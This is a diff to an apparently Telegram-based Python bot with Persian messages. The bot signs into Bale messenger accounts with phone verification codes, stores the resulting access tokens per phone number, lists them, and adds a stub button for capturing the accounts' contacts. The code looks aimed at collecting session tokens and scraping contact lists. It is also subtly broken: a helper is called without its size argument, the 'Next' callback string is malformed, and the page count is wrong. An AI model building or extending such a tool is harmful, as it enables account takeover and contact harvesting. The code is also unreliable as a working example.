@@ -46,6 +46,9 @@ def encode_proto(json_d):
     res = encoder.encode_grpc()
     return res
 
+def convert_to_2d_list(input_list, n):
+    return [input_list[i:i + n] for i in range(0, len(input_list), n)]
+
 @bot.message_handler(content_types=['text'], chat_types=['private', 'supergroup'])
 async def onMessages(msg: Message):
     await manager.validate(msg.from_user.id)
@@ -58,11 +61,24 @@ async def onMessages(msg: Message):
             verify_encode = encode_proto({'1:2': f'{result}', '2:2': f'{auth}', '3:2': {'1:0': 1}})
             try:
                 sendcode = requests.post('https://next-ws.bale.ai/bale.auth.v1.Auth/ValidateCode', data=verify_encode, headers=request_headers)
-                print(sendcode.text)
-                print()
-                print(sendcode.json())
             except:
                 pass
+
+            if sendcode.status_code == 200:
+                res_decode = decode_proto(sendcode.text)
+                acctoken = res_decode['4:2']['1:2']
+                await manager.setToken(msg.from_user.id, inc.phone, acctoken)
+                await manager.clearIncludes(msg.from_user.id)
+                await bot.reply_to(msg, "[ 🍡 ] - توکن با موفقیت به لیست اد شد !", reply_markup=InlineKeyboardMarkup().add(
+                    InlineKeyboardButton("tokens 🎞", f"tokensPage_1_{msg.from_user.id}"),
+                    InlineKeyboardButton("close", "close")
+                ))
+            
+            else: 
+                await manager.clearIncludes(msg.from_user.id)
+                await bot.reply_to(msg, "[ ❌ ] - خطا در لاگین ! دوباره سعی کنید", reply_markup=InlineKeyboardMarkup().add(
+                    InlineKeyboardButton("close", "close")
+                ))
 
     if msg.text.startswith("لاگ"):
         if inc.phone == "":
@@ -134,5 +150,62 @@ async def onQuery(call: CallbackQuery):
                 await bot.edit_message_text("[ 🛰 ] - ارور HTTP, مشکل رو با ادمین های ربات به اشتراک بگذارید", reply_markup=InlineKeyboardMarkup().add(
                     InlineKeyboardButton("close", callback_data="close")
                 ), chat_id=call.message.chat.id, message_id=call.message.id)
+
+    elif call.data.startswith("tokensPage"):
+        if call.message.reply_to_message.from_user.id == call.from_user.id:
+            spl = call.data.split("_")
+            page = int(spl[1])
+            uid = int(spl[2])
+            includes = await manager.getIncludes(call.from_user.id)
+            alltokens = includes.tokens.keys()
+            fof = convert_to_2d_list(alltokens)
+            fofx = fof[page]
+            keybinds = InlineKeyboardMarkup()
+            total_pages = (len(alltokens) + 5 - 1)
+
+            for token in fofx:
+                keybinds.add(
+                    InlineKeyboardButton(token, callback_data=f"token_{token}")
+                )
+
+            if page > 0:
+                keybinds.add(
+                    InlineKeyboardButton("⏮ Previous", callback_data=f"tokensPage_{page - 1}_{uid}")
+                )
+            
+            if page < total_pages - 1:
+                keybinds.add(
+                    InlineKeyboardButton("Next ⏭", callback_data=f"tokensPage{page + 1}_{uid}")
+                )
+
+            await bot.send_message(
+                call.message.chat.id,
+                f"[ 🎛 ] - صفحه {page+1}/{len(fof)}\n[ 🚩 ] - شماره رو انتخاب کنید",
+                reply_markup=keybinds
+            )
+    
+    elif call.data.startswith("token_"):
+        if call.message.reply_to_message.from_user.id == call.from_user.id:
+            spl = call.data.split("_")
+            phone = spl[1]
+            mark = InlineKeyboardMarkup()
+            mark.add(
+                InlineKeyboardButton("کپچر مخاطبین", f"capture_{phone}_{call.from_user.id}"),
+                InlineKeyboardButton("⏮ بازگشت", f"tokensPage_1_{call.from_user.id}")
+            )
+            mark.add(
+                InlineKeyboardButton("بستن", "close")
+            )
+
+            await bot.send_message(call.message.chat.id, f"[ 🎪 ] - شماره {phone}", reply_markup=mark)
+
+    elif call.data.startswith("capture_"):
+        if call.message.reply_to_message.from_user.id == call.from_user.id:
+            spl = call.data.split("_")
+            phone = spl[1]
+            user = int(spl[2])
+            inc = await manager.getIncludes(call.from_user.id)
+
+            print("CAPPTITTUTUTU") # Capturing 
 
 asyncio.run(bot.polling())
